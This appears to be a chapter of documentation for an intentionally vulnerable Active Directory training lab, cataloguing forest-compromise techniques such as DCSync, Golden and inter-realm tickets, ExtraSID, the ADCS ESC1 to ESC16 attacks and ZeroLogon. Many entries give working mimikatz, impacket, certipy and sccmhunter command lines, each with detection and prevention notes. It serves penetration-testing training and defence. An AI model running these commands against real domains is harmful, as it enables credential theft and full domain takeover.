# 07 — Domain & Forest Compromise (DF-001..040)

End game. These are the techniques that turn "I have a foothold" into "I own the forest." Many depend on chains from earlier docs (CRED + LAT + ADCS).

---

### DF-001 — Golden Ticket
See PER-018. Forge TGT with krbtgt hash → impersonate any principal in the domain.

---

### DF-002 — Silver Ticket
See PER-019.

---

### DF-003 — DCSync All Hashes
**What it is:** dump every credential in the domain (NT hashes + Kerberos keys + machine secrets + krbtgt). End-state credential access.
**Tools:** `impacket-secretsdump -just-dc`.
**Steps:**
```bash
impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc
```
**Detection:** Defender for Identity native; non-DC IP issuing DRSR.
**Prevention:** audit DCSync rights; remove non-DC principals with `Replicating Directory Changes (All)`.

---

### DF-004 — DCShadow
See CRED-015.

---

### DF-005 — SID-History Injection (Forest)
See PER-016. Cross-forest variant: inject Enterprise Admin SID from foreign forest.

---

### DF-006 — Trust Ticket Abuse (Inter-Realm TGT)
**What it is:** with the trust key (`TrustKey2024!`), forge an inter-realm TGT for the trusted forest's krbtgt.
**Tools:** mimikatz `kerberos::golden /service:krbtgt /target:finance.local /sid:CORP /rc4:TRUSTHASH`.
**Detection:** anomalous inter-realm `4769`s.
**Prevention:** rotate trust keys; selective auth; SID filtering.

---

### DF-007 — ExtraSID Parent-Child
**What it is:** in a parent-child trust, SID filtering is *not* applied — a child-domain admin can forge a TGT with parent's Enterprise Admin SID (RID 519) and become EA.
**Why it works here:** `eu.corp.local` is a child of `corp.local`.
**Tools:** mimikatz `kerberos::golden /sids:S-1-5-21-CORP-519`.
**Steps:**
```powershell
# from eu.corp.local DA, knowing eu.corp.local krbtgt hash:
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:eu.corp.local /sid:S-1-5-21-EU /sids:S-1-5-21-CORP-519,S-1-5-21-CORP-512 /krbtgt:EUKRBHASH /ptt"
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"
```
**Detection:** MDI native alert; abnormal cross-domain TGS with EA SIDs.
**Prevention:** there is *no built-in SID filtering on parent-child trusts*. The mitigation is treating every child-domain admin as forest admin. Modern advice: one forest, one domain.

---

### DF-008 — SID Filtering Bypass
**What it is:** external/forest trust with SID filtering disabled allows the cross-forest TGT to carry arbitrary SIDs.
**Tools:** mimikatz golden + foreign SID.
**Detection:** MDI.
**Prevention:** ensure SID filtering is enabled (`netdom trust /enablesidhistory:no`); quarantine attribute.

---

### DF-009 — Foreign Security Principal Hijack
See LAT-034.

---

### DF-010 — Cross-Forest Kerberoasting
**What it is:** services in a trusted forest still have crackable SPNs reachable via the trust. Kerberoast across.
**Tools:** `Rubeus kerberoast /domain:finance.local`, `impacket-GetUserSPNs -target-domain finance.local`.
**Detection:** abnormal cross-realm TGS requests.
**Prevention:** AES-only; gMSAs; selective auth.

---

### DF-011 — ADCS ESC8 (Web Enrollment NTLM Relay)
**What it is:** HTTP web enrollment + NTLM + no EPA = relay any coerced auth → cert for DC$ → DCSync.
**Tools:** `ntlmrelayx --adcs --template DomainController`, `PetitPotam`/`Coercer`.
**Steps:** see CRED-020 (chain).
**Detection:** MDI ADCS ESC8 alert; abnormal ADCS certs issued to DC$ by non-DC requester.
**Prevention:** disable NTLM on ADCS web; enable EPA; require HTTPS; certificate auth only.

---

### DF-012 — ADCS ESC1 (SAN-spec template)
**What it is:** vulnerable template properties: `mspki-certificate-name-flag = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + EKU Client Auth + Domain Users enroll + no manager approval. Request a cert specifying SAN = `Administrator@corp.local` → PKINIT as DA.
**Why it works here:** Ansible publishes `ESC1Template`.
**Tools:** `Certipy`.
**Steps:**
```bash
certipy find -u peter.parker -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template ESC1Template \
   -upn Administrator@corp.local -target ca01.corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# now NT hash for Administrator
```
**Detection:** ADCS `4886`/`4887` with requester ≠ SAN; MDI ESC1.
**Prevention:** remove `ENROLLEE_SUPPLIES_SUBJECT` from templates with Client Auth EKU; require manager approval.

---

### DF-013 — ADCS ESC2 (Any Purpose / SubCA EKU)
**What it is:** template with EKU "Any Purpose" or empty → cert usable for any purpose, including SubCA (sign other certs).
**Tools:** `Certipy req -template ESC2Template`.
**Detection:** ADCS abnormal EKU on issued certs.
**Prevention:** never publish templates with "Any Purpose" EKU enrollable by users.

---

### DF-014 — ADCS ESC3 (Enrollment Agent Template)
See CRED-047.

---

### DF-015 — ADCS ESC4 (Vulnerable Template ACL)
**What it is:** `GenericAll`/`WriteDACL` on a template → modify it to be ESC1 → exploit.
**Tools:** `Certipy template -save-old`.
**Steps:**
```bash
certipy template -u peter.parker -p 'DVADlab2024!' -template ESC4Template -save-old
# then exploit as ESC1
```
**Detection:** Event `5136` on template object; MDI ESC4.
**Prevention:** audit template DACLs; restrict to PKI admins.

---

### DF-016 — ADCS ESC5 (PKI Object ACL)
**What it is:** weak ACL on CA / PKI containers (NTAuthCertificates, Enrollment Services).
**Tools:** `Certipy ca`, `Certipy find`.
**Detection:** Event `5136` on PKI containers.
**Prevention:** audit ACLs under `CN=Public Key Services,CN=Services,CN=Configuration`.

---

### DF-017 — ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
See CRED-027.

---

### DF-018 — ADCS ESC7 (Manager/Officer role abuse)
**What it is:** low-priv Certificate Manager / Officer can approve pending requests. Submit a sketchy cert request, approve it yourself.
**Tools:** `Certipy ca -issue-request`.
**Steps:**
```bash
certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template User -upn Administrator@corp.local
# request goes to pending; with officer rights:
certipy ca -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -issue-request <ID>
certipy req -retrieve <ID>
```
**Detection:** ADCS audit logs; officer approval of unusual requests.
**Prevention:** require multi-person approval; restrict officer membership.

---

### DF-019 — ADCS ESC8 (duplicate of DF-011 with explicit relay flow)
See DF-011.

---

### DF-020 — ADCS ESC9 (No Security Extension)
**What it is:** template flag `CT_FLAG_NO_SECURITY_EXTENSION` set → cert doesn't carry the user's SID. If `StrongCertificateBindingEnforcement` is loose, you can rebind the cert to a different user via altSecurityIdentities.
**Tools:** Certipy ESC9.
**Detection:** abnormal altSecurityIdentities writes.
**Prevention:** remove `CT_FLAG_NO_SECURITY_EXTENSION`; KB5014754 strict mapping.

---

### DF-021 — ADCS ESC10 (Weak CA Reg / Cert Publishers ACL)
**What it is:** writable CA registry / Cert Publishers group → publish your own cert or modify CA flags.
**Detection:** Event `4670` on CA reg.
**Prevention:** tier CA admins.

---

### DF-022 — ADCS ESC11 (NTLM Relay to ICPR RPC)
**What it is:** RPC interface `ICertPassage` (ICPR) accepts NTLM and isn't EPA-protected → relay to issue certs.
**Tools:** `ntlmrelayx -t rpc://ca01 --adcs`.
**Detection:** abnormal ICPR sessions.
**Prevention:** enforce Kerberos on CA RPC; EPA; ADV230002.

---

### DF-023 — Child → Enterprise Admin (no SID filtering)
See DF-007.

---

### DF-024 — noPac
See CRED-023.

---

### DF-025 — Certifried
See CRED-024.

---

### DF-026 — CVE-2022-33647 (S4U2Self LPE chain to EoP)
Prevention: patch.

---

### DF-027 — sAMAccountName spoofing across trust
**What it is:** noPac across trust boundary — rename machine to foreign DC's sAMAccountName → forge cross-realm TGT.
**Detection:** anomalous foreign-realm Kerberos; MDI.
**Prevention:** patch KB5008380; MachineAccountQuota=0.

---

### DF-028 — Read-Only DC Abuse (PRP)
**What it is:** Password Replication Policy on RODC reveals cached credentials. With RODC admin, expand the list (`Allowed-RODC-Password-Replication-Group`).
**Tools:** mimikatz `lsadump::dcsync /domain:corp.local /dc:rodc01 /user:Administrator` (against allowed accounts).
**Detection:** Event `4742` on `msDS-RevealOnDemandGroup`.
**Prevention:** strict PRP; RODC admin only for trusted ops.

---

### DF-029 — GPO Delegation → DA
See PE-018 / PER-034.

---

### DF-030 — Schema Admin Hijack
See PER-031.

---

### DF-031 — ADCS ESC13 (Issuance Policy → Group)
**What it is:** template's Issuance Policy OID is linked to a privileged group via `msDS-OIDToGroupLink`. Enrolling the template grants effective membership in that group.
**Tools:** `Certipy req -template ESC13Template`.
**Steps:**
```bash
certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template ESC13Template
certipy auth -pfx peter.parker.pfx
# resulting TGT carries the linked group SID in PAC
```
**Detection:** ADCS audit + MDI ESC13.
**Prevention:** never link issuance policies to privileged groups; review `msDS-OIDToGroupLink`.

---

### DF-032 — ADCS ESC14 (Explicit Cert Mapping)
**What it is:** with `altSecurityIdentities` write on a victim AD object + a cert you control, map cert→victim. PKINIT auth → victim's TGT.
**Tools:** Certipy + `Set-ADUser -Add @{altSecurityIdentities=...}`.
**Detection:** Event `5136` on altSecurityIdentities; KB5014754 strict mapping rejects.
**Prevention:** strict cert mapping (KB5014754); audit altSecurityIdentities writes.

---

### DF-033 — ADCS ESC15 (EKUwu / CVE-2024-49019)
See CRED-028.

---

### DF-034 — ADCS ESC16 (CA-wide No Security Extension)
**What it is:** CA registry `DisableExtensionList` includes `szOID_NTDS_CA_SECURITY_EXT` → *all* issued certs miss the user-SID extension → ESC9-like, but for the whole CA.
**Tools:** `Certipy ca -disable-extension`.
**Detection:** registry change to CA `DisableExtensionList`.
**Prevention:** never disable szOID_NTDS_CA_SECURITY_EXT; require strict mapping.

---

### DF-035 — ZeroLogon (CVE-2020-1472)
**What it is:** Netlogon AES-CFB8 IV-of-zeros bug — set DC$ password to empty via crafted NetrServerAuthenticate2 calls. Then DCSync as DC.
**Why it works here:** `FullSecureChannelProtection=0`, unpatched.
**Tools:** `zerologon_tester.py`, `cve-2020-1472-exploit.py`.
**Steps:**
```bash
python3 zerologon_tester.py DC01 10.10.0.10           # test
python3 cve-2020-1472-exploit.py DC01 10.10.0.10      # exploit, sets DC$ password to empty
impacket-secretsdump -no-pass 'DC01$'@10.10.0.10 -just-dc
# !!! restore DC password before leaving: reinstall_original_pw.py — otherwise replication breaks
```
**Detection:** MDI native; Event `5827` (Netlogon insecure RPC).
**Prevention:** patch (August 2020 cumulative); `FullSecureChannelProtection=1`.

---

### DF-036 — MS14-068
See CRED-063.

---

### DF-037 — Cross-Forest Trust Ticket with EA SID
See DF-006/008 — combined.

---

### DF-038 — Foreign Group Membership Privilege Escalation
See LAT-034.

---

### DF-039 — SCCM Site Takeover
**What it is:** SCCM with NAA + HTTP MP → harvest NAA creds → push-install coerces machine auth → relay to MSSQL site DB → site admin.
**Tools:** `sccmhunter`, `SharpSCCM`, `ntlmrelayx -t mssql://`.
**Steps:**
```bash
sccmhunter find -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
sccmhunter naa -u peter.parker -p 'DVADlab2024!' -t sccm.corp.local
```
**Detection:** SCCM audit logs; abnormal MSSQL `EXECUTE AS`; MDI.
**Prevention:** disable NAA; enhanced HTTP/PKI mode; tier SCCM admins.

---

### DF-040 — Diamond + Sapphire cross-forest persistence
See PER-021/022 applied with foreign krbtgt + SID History to maintain Enterprise Admin across forests.

---

Next: [`08-solve-path.md`](08-solve-path.md) — full canonical solve + wireframe diagrams of every solving pattern.
